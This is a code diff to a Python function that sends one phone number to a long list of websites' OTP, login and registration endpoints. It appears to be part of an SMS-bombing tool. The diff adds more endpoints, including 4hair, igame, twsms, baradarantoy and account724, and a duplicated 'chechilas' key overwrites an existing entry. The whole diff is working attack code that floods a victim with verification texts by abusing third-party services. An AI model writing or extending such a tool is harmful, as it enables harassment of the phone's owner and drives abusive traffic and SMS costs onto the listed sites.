@@ -1,8 +1,13 @@
 def send_otp_requests(number):
     url_payload_map = {
         'janebi': ('https://janebi.com/signin?do', {'resend': '0' + number}),
+        '4hair': ('https://4hair.ir/user/login.php', {'num': '0' + number,'ok':''}),
+        'igame': ('https://igame.ir/api/play/otp/send', {'phone': '0' + number}),
+        'twsms': ('https://twsms.ir/client/register.php', {'mobile': '0' + number,'agree':'agree','sendsms':'1'}),
+        'baradarantoy': ('https://baradarantoy.ir/send_confirm_sms_ajax.php', {'user_tel': '0' + number}),
         'kavirmotor': ('https://kavirmotor.com/sms/send', {'phoneNumber': '0' + number}),
         'chechilas': ('https://chechilas.com/user/login', {'mob': '0' + number}),
+        'chechilas': ('https://searchii.ir//controler//phone_otp.php', {'mobile_number': '0' + number,'action':'send_otp','login':'user'}),
         'badparak': ('https://badparak.com/register/request_verification_code', {'mobile': '0' + number}),
         'hermeskala': ('https://hermeskala.com//login/send_vcode', {'mobile_number': '0' + number}),
         'elinorboutique': ('https://api.elinorboutique.com/v1/customer/register-login', {'mobile': '0' + number}),
@@ -198,6 +203,11 @@ def send_otp_requests(number):
             'controller': 'authentication','back':'my-account','fc':'module',
             'ajax': 'true','module':'iverify',
             'phone_mobile':'0' + number,'SubmitCheck':''
+        }),
+        'account724': ('https://account724.com/wp-admin/admin-ajax.php', {
+            'action': 'stm_login_register',
+            'type': 'mobile',
+            'input':'0' + number
         }),
     }
     return list(url_payload_map.values())
